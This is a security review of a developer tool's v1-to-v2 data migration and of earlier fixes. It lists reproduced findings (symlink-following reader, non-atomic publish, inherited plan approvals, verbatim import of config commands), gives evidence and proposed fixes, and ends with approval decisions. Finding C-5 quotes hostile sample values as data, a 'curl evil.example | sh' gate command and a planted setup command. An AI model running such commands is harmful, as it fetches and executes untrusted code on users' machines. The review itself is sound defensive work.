# M1c/M1d security review (`conductor migrate`, Linear-free UI, Linear retired) + verification of the M1b fixes

- Subject: clone `/Volumes/Sandisk/github/techteam-conductor-v2`, code at `1edccfa` (`a7cb467` M1b review fixes, `aea92f8`/`f456ba7` M1c, `9814b6f` security fixes B-1..B-10, `1edccfa` M1d; `44169c6` is docs only). Exported with `git archive 1edccfa` to a scratch directory; nothing in the clone was edited except this file.
- Rules kept: throw-away `CONDUCTOR_HOME` / `CONDUCTOR_BACKUP_DIR` / `HOME` per run; no real CLI (claude/agent/codex); fake agents only; `~/.conductor`, `~/.conductor-v2`, `~/.conductor-backups` and `~/Library/LaunchAgents` untouched (the marker-present branch of `uninstall --purge` and `service install` were NOT executed because they call `launchctl`). Probe scripts: `/private/tmp/claude-501/-Volumes-Sandisk-github-techteam-conductor/7b88419e-600f-4142-ac15-d9bbfc9a540e/scratchpad/sec/c3/*.ts` and `.../sec/m1c/test/zz-*.test.ts` (project harness).
- Baseline on the export (fake HOME): `migrate`, `security-m1b`, `engine-matrix`, `engine-safety`, `engine-board`, `engine-security`, `engine-human`, `engine-loop`, `lock`, `board`, `hardening`, `schema`, `import-graph`, `server`, `core`: 244 tests, 243 pass, 1 skipped, 0 fail. The preload really overrides my exported `CONDUCTOR_HOME`/`CONDUCTOR_BACKUP_DIR` (both of my directories stayed empty) and the fake HOME stayed empty, so the suite did not touch any home.

## Part A — M1b security findings: verification of the fixes

| ID | Result | Evidence (re-run on 1edccfa) |
| --- | --- | --- |
| B-1 symlinked `.conductor/plan.md` / `diff.patch` | **Closed** | Same hostile-repo PoC: run reaches `ready`, both victim files unchanged (`ORIGINAL-1`, `ORIGINAL-2`). `safeWriteInside` + `ensureRealDir` replace the link, never follow it. |
| B-2 foreign worktree | **Closed (two small residuals)** | PoC with a run record pointing at a v1-style checkout (dirty file, branch `conductor/eng-1`): retry goes to `needs_human`, v1 HEAD unchanged, no `.conductor`/`.cursor` written there. `removeWorktree(v1 checkout, v1 branch)` now throws BEFORE removing: checkout, uncommitted file and branch all survive. `migrateRunV1ToV2` blanks `worktree/branch/baseSha/commitSha` into `legacy.v1*`. Residuals: (a) `rerunFromHuman` skips `assertOwnedWorktree` when the run's repo is not registered (`if (repo0)`), so `backupRefs`/`resetToBase` still run on `run0.worktree`; make the assertion unconditional (unknown repo = refuse). (b) `assertOwnedWorktree` compares real paths and only rejects a branch mismatch when `symbolic-ref` succeeds, so a foreign checkout on a detached HEAD reached through a symlink planted at the expected path would pass; treat a detached HEAD as a mismatch. (b) was found by reading the code, not executed. Both need same-user write access. |
| B-3 storage failure is transient | **Closed** | Failing board: effects stay `pending` (not `done`), `storageProblem()` is null at t0 and "The board could not be written: ..." after 16 s; the client-visible message carries no path. |
| B-4 write/load asymmetry | **Closed** | `idemKey` 400 chars, `stage` 80 chars, comment `idemKey` 400: all `bad_input` at write time; after a crash and a later write the board opens and nothing is torn. |
| B-5 quarantined run re-claimable | **Closed** | Truncated `run.json`: renamed + `run.json.tombstone`; `has()` true; `create()` throws "already exists"; read-only store leaves the file alone. |
| B-6 raw agent text in `run.json` / `verdict-N.json` / `GET /api/runs/:key` | **Deferred; does not need to block, but the docs are wrong** | Re-run: the probe secret (a non-token-shaped `.env` value plus an `sk-ant-` token) is absent from board comments, bug cards and events, and present in `run.json`, `verdict-1.json` and the `toDetail` response. `docs/ARCHITECTURE.md` says "run.json still contains agent text unredacted at rest (everything shown or posted is redacted)" and the safety table says every agent string is redacted "before it reaches the board/logs/UI": the run-detail API shown in the dashboard is a counter-example. I do not require a code fix for M1c/M1d (pre-existing v1 posture, same-user, loopback), but the sentence must be corrected, or redact-on-read added in `toDetail` (about 20 lines). |
| B-7 shared label/cookie/port | **Closed (constants checked, launchd not executed)** | `SERVICE_LABEL = 'com.techteam.conductor-v2'`, cookie `conductor_v2_session`, default port 4327. |
| B-8 `uninstall --purge` guard | **Closed for the refusal path** | `CONDUCTOR_HOME=<folder without home.json> conductor uninstall --purge`: "Refusing to delete ...", exit 2, folder intact, and the check runs before `uninstallService()`. Not executed: the marker-present branch. Note it still deletes the whole board with no copy (not claimed otherwise). |
| B-9 importer parks in-flight runs | **Closed in code; see C-4 for the approval gap** | `queued/running/paused/failed` become `needs_human` with origin `plan`; the board card is `autoStart:false`. |
| B-10 API cleanups | **Closed** | `description: null` is now a no-op, `storage_failed`/`closed` -> 503, `full` -> 409, no filesystem path in client messages. (The board list is still unpaged with full descriptions: info.) |

Decision (M1b fixes): Approved — B-1..B-5, B-7..B-10 are closed with the two small B-2 residuals above (fix in the next pass); B-6 may stay deferred if the documentation is corrected.

## Part B — M1c/M1d review

### What I checked and found sound

- v1 is never written, renamed or locked by the reader. Over 20 layouts (dry run and apply) the v1 folder was byte- and mtime-identical afterwards: symlinked run directory, run.json and artifact; directory named like a key without `run.json`; a file named like a key; `run.json` that is a directory; syntactically corrupt `run.json` (the read-only `RunStore` does not quarantine it); `schemaVersion: "x"`; artifact names with newlines or traversal (`ARTIFACT_RE` is anchored without `m`, so `plan-1.json\nx` is rejected); hostile field values (below). No `board.lock`/`run/lock.json` is ever created in v1, and `migrate` never calls `ensureHome()` or `acquireLock`.
- Failure cleanup: every thrown error in my 13 hostile-field runs left no target folder and no staging sibling; a `kill -9` at any hook point leaves at most an obviously-named `v2.staging-*` sibling and the re-run succeeds (their test; consistent with my reading).
- The `changed during import` check covers every file that was read (config, state, each `run.json` and artifact) and the staged copies are re-hashed against the read-time hash; a run that v1 appends to during the import makes apply refuse and publish nothing.
- Backup (hardened `backupPaths`): config.json, state.json and everything under `runs/` are copied with verified hashes into a 0700 directory with 0600 files; `secrets.json`, `run/`, `logs/`, `sessions.json` are never copied; symlinks are skipped and listed in the manifest; the original v1 Keychain entry is never read or deleted.
- Board/run content produced by the importer: `author` is never `user` for imported comments (actor `import` maps to `conductor`), so imported text cannot become "requester notes"; `external.url` is accepted only when it starts with `https://linear.app/` (a `javascript:` URL in `legacy.url` is dropped); project `repo` is only a registered repository name; titles are one-lined and truncated; descriptions truncated at 50 000; `autoStart` is false for every imported card; `worktree/branch/baseSha/commitSha` are blank/namespaced; pending Linear effects are dropped; `assignedPickup` runs get `untrusted: true`.
- Config v3: the `linear` block moves under `legacy` and is never interpreted; `__proto__`/`constructor`/`prototype` keys are dropped at the top level of `legacy`/`extra`; with nested `__proto__` keys in the source JSON nothing pollutes `Object.prototype` and `Object.assign(target, cfg.legacy)` leaves the target prototype intact.
- UI (`ui/app.js`): every dynamic string goes through `h()`, which creates text nodes or calls `setAttribute` with fixed attribute names; there is no `innerHTML`/`insertAdjacentHTML`/`document.write`/`eval` anywhere; links go through `safeHttp` (http/https only) with `rel="noopener noreferrer"`; notes, card titles, the ignored-card reason and the cards feed render as text. No new HTTP routes were added in M1c (`move`, `comment`, `edit`, `approve` are the existing, CSRF-gated ones); `approve` carries the client's `rev` and the server refuses a stale one. The `cards` array in `/api/state` and the SSE `state` event holds only `key, title, lane, kind, createdAt, updatedAt, note` (no description, no comments), behind the session cookie.
- Cookie: `conductor_v2_session`; a v1 cookie sent to v2 is simply ignored.
- M1d: no `src/linear`, no Linear tests/mocks/vendored schema, `graphql` removed, zero runtime and now only two dev dependencies (`typescript`, `@types/node`); `import-graph.test.ts` passes; the only network client left in `src` is the unix-socket control channel (`http.request({socketPath})`); no `fetch`, no sockets to the outside. `registerSecretEnv` is empty (ready for M2). Cosmetic: `package.json` `description` still says "runs Linear issues".

### Findings

#### C-1 (Medium, blocking) — `--to` inside `--from` writes into the v1 folder
Evidence (reproduced): `migrate({from: <v1>, to: <v1>/v2-import, apply: true})` publishes; the v1 folder gained `v2-import/` (board, journal, snapshot...) and the staging sibling is created inside it first. This breaks the headline guarantee ("v2 never touches the v1 folder", "v1 never written").
Fix: resolve both paths with `realpath` (after creating nothing) and refuse when `to`, its staging sibling's parent chain, or `from` contains the other (either direction), including through symlinks; add the case to `migrate.test.ts`.

#### C-2 (Medium, blocking) — the publish step for an "empty skeleton" target is neither atomic nor race-safe
Evidence (reproduced with the `before-publish` hook standing in for a v2 that starts in that window): with a target skeleton (`logs`, `run`, `runs`, `board`, `home.json`), a concurrent v2 that creates `run/lock.json` makes the clearing loop remove `board`, `logs` and `home.json` and then fail with `ENOTEMPTY`: the live v2 home is left without its marker (the next start refuses it as "contains data from v1 or another tool"); `logs/x.log` gives the same damage; `board/journal.ndjson` happens to fail first and leaves it intact (order-dependent). The window is the whole backup + staging + validation time.
Fix: do not clear a skeleton in place. Either require the target to be absent, or `rename(to, to.old-<ts>)` first, re-check that the renamed folder is still an empty skeleton, rename staging into place, and roll back the first rename if anything is not empty; alternatively hold `acquireLock(<to>/run/lock.json)` for the whole import so a starting v2 fails with "already running".

#### C-3 (Medium, blocking) — the v1 reader trusts its input
The reader is `RunStore(readOnly).list()` plus `readFileSync` of config/state/artifacts, with no file-type or size checks. All of these were reproduced; none writes anything, all fail closed or import foreign data:
- Symlinks are followed. A symlinked run directory or `run.json` is imported (its content ends up in the new card, in `runs/<key>/run.json` — the whole object is spread into the staged record — and in staged artifacts) while the backup skips it. Example: a `run.json` symlink to a JSON file elsewhere on the machine is merged into the import.
- A FIFO as `run.json` (or config/state) makes even a DRY RUN hang forever (`readFileSync` blocks).
- No size caps: a 700 MB `events.ndjson` makes migration throw "Cannot create a string longer than 0x1fffffe8 characters" at RSS 831 MB; the backup would copy any regular file under `runs/` with a whole-file read.
- `loadVersionedInMemory` accepts any integer `version`: `-300000000` takes 68.8 s (about 7 minutes at -2e9; effectively forever for `-9e15`), dry run included. The real loader rejects stamps below 1.
- Odd field values abort the whole import with a raw error (nothing published): `title` object (TypeError), `history` a string (TypeError), `history[].ts` invalid (RangeError), `description` a number (BoardError), a `key` field that is a traversal or names another run (ENOENT scandir of an arbitrary path), a run stamped `schemaVersion` 7 (NewerVersionError). One bad run blocks migration of all runs; the test named "nothing crashes" only covers oversize text and a bad directory name.
Fix: one `readV1File(path)` helper used for config, state, `run.json` and artifacts: `lstat` must say regular file (no symlink, FIFO, device), size <= a cap (for example 50 MB), else skip with a warning; take the key from the directory name and require `run.key === dirname`; accept `version` only as an integer >= 1; coerce/validate each field (`title`/`description` strings, `history` array of `{ts: finite, text: string}`, `status` in the known set) and skip a bad run with a warning instead of throwing; refuse a `runs` symlink; give the backup the same size cap.

#### C-4 (Medium, blocking) — imported cards do NOT force plan approval, and README/ARCHITECTURE say they do
Evidence (reproduced with the harness: a synthesized v1 folder from a real finished run, migrated, then a v2 engine on the result with fake agents): two non-`assignedPickup` imports, one `needs_human` with origin `build` and a prompt-injection sentence in its description, one `ready`. After the user presses Retry on the first and moves the second to To do: both reach `ready` with a `--force` Cursor build (2 build calls), `approval requested = false`; the first built straight from the imported plan with v1's `planApproved: true, approvedBy: human` (a `retryStage` of `build` skips the plan stage and the approval gate), the second was `approvedBy: auto`. `untrusted` is set only for `assignedPickup` runs. Docs that contradict this: README ("Imported text is treated as unverified, so its plan waits for your approval"; flow diagram "imported/unverified text wait for your OK") and `docs/ARCHITECTURE.md` lines 47 and 73 ("imported cards force plan approval"). Nothing starts by itself (every imported card needs a deliberate Retry/To do), so this is a safety-claim and inherited-approval gap, not a silent start.
Fix: set `untrusted: true` on EVERY imported run; reset every non-terminal imported run to origin `plan` (not only the in-flight ones) and clear `planApproved`/`approvedBy` so a Retry re-plans and approval is requested; or, if the intent is to honour v1 approvals for the user's own folder, say so in the README and keep the forced approval only for foreign-looking runs. Either way the three documents must match the code.

#### C-5 (Low-Medium, non-blocking) — importing a folder means trusting its config and approvals
The staged `config.json` carries `repos[].gates[].cmd`, `repos[].setup`, `envPassthrough`, `copyFiles`, `agents.*.bin` and `worktreeRoot` from v1 verbatim (reproduced: `curl evil.example | sh` as a gate command, `echo pwned > /tmp/pwned` as setup, `/tmp/evil-claude` as the Claude binary all survive), and those run as the user at the next gate/setup/stage. The dry-run report (`MigrateReport`) lists projects, cards and warnings but none of these. Repos are also not re-checked by `inspectRepo` (home-directory and conductor-home guards). For the user's own v1 folder this is correct; for any other folder it is code execution. Fix: print the imported repo paths, gate/setup commands, `envPassthrough` names and agent binaries in the dry run and in the apply summary, add one line "only migrate a folder you created", and consider re-detecting gates (as the setup wizard does) instead of copying commands.

#### C-6 (Low) — staged files keep v1's permissions
Reproduced: artifact copies keep the source mode (`plan-1.json` 0644, `events.ndjson` 0666) inside 0700 directories; `run.json`, `config.json`, `home.json` are 0600. Fix: `chmod 0600` each copy (the backup already does).

#### C-7 (Low) — smaller importer points
- A hostile run key `ABC-999999999` raises the project's counter to 10^9; the next card in that project is rejected (`item.key (ABC-1000000000)`): that project can no longer create cards. The re-key loop (`+ 100000 * i`) can also overflow the 9-digit key limit. Cap imported numbers (for example <= 99 999 999) and report.
- A run with an unknown `status` is imported into `todo` (the lane lookup returns undefined and `createItem` defaults to `todo`) and stays inert; map unknown statuses to `needs_human` with a note.
- Imported titles, descriptions and the history comment are not redacted for secrets (the history comment is token-shape redacted without the repo's `.env` values). The text came from the user's own Linear data, so this is acceptable; say so.
- "changed during import" only watches files that were read: a run directory created in v1 during the window is silently missing from v2 (reproduced: published with 1 of 2 runs, `changedDuringImport` empty). Re-list `runs/` after staging and refuse on a difference.

#### C-8 (Info) — backup contents and retention
The backup copies every regular file under `runs/`, not only the importable artifacts (prompt audit files with task text and repo convention excerpts, `diffstat.txt`, gate outputs, event logs). All are redacted at v1 write time or non-secret, but they are sensitive code-adjacent data kept indefinitely outside both homes (0700/0600). There is no prune command and a pre-existing 0755 backup root is not tightened. Add `conductor backups prune`, document the retention, and apply the artifact allow-list to the backup as well.

#### C-9 (Low) — documentation claims versus code
| Claim | Verdict |
| --- | --- |
| README "v2 never touches the v1 folder" | True except C-1. |
| README/ARCHITECTURE "imported cards force plan approval" | False (C-4). |
| README "creates ~/.conductor-v2 (one atomic step)" / ARCHITECTURE "one atomic rename" | True for a new target; not for the empty-skeleton path (C-2). |
| ARCHITECTURE "every string from agents is redacted before it reaches the board/logs/UI" and "everything shown or posted is redacted" | False for `GET /api/runs/:key` (B-6). |
| README "Anything still active in v1 shows up as Needs you; v2 never starts the same work twice" | True (verified). |
| TROUBLESHOOTING "v1 and v2 use different data folders, ports, cookies and launchd labels" | True (constants verified). |
| ARCHITECTURE "a run only ever works in the checkout v2 itself created" | True except the two B-2 residuals. |

#### C-10 (Info) — test preload
`test/preload.ts` now always overrides `CONDUCTOR_HOME` and `CONDUCTOR_BACKUP_DIR`, and `npm test`/`test:live` load it with `--import`; my run confirmed no leakage. It only protects runs that go through those scripts: `node --test test/x.test.ts` without `--import` falls back to the default `~/.conductor-v2` home (never `~/.conductor`). Belt and braces: make `conductorHome()` throw when `NODE_TEST_CONTEXT` is set and `CONDUCTOR_HOME` is not.

## Blocking list for M1c/M1d

1. C-1: refuse `--to` inside `--from` (and the reverse), by real path including symlinks; test.
2. C-2: replace the in-place skeleton clearing with an atomic, re-checked rename (or require an absent target / hold the v2 lock); test with a concurrent start.
3. C-3: harden the v1 reader (regular files only, size caps, key = directory name, integer version >= 1, per-run validation with skip-and-warn), including the backup's size cap; tests for symlink, FIFO, huge file, hostile version, odd fields.
4. C-4: make imported runs require approval (untrusted for all, non-terminal imports reset to re-plan with approval cleared), or correct README and ARCHITECTURE lines 47/73; the behaviour and the three documents must match.

Not blocking: C-5 (show imported commands in the dry run), C-6, C-7, C-8, C-9 (fix the redaction sentence or add redact-on-read), C-10, the two B-2 residuals.

Decision (M1b fixes): Approved

Decision (M1c/M1d security): Changes requested
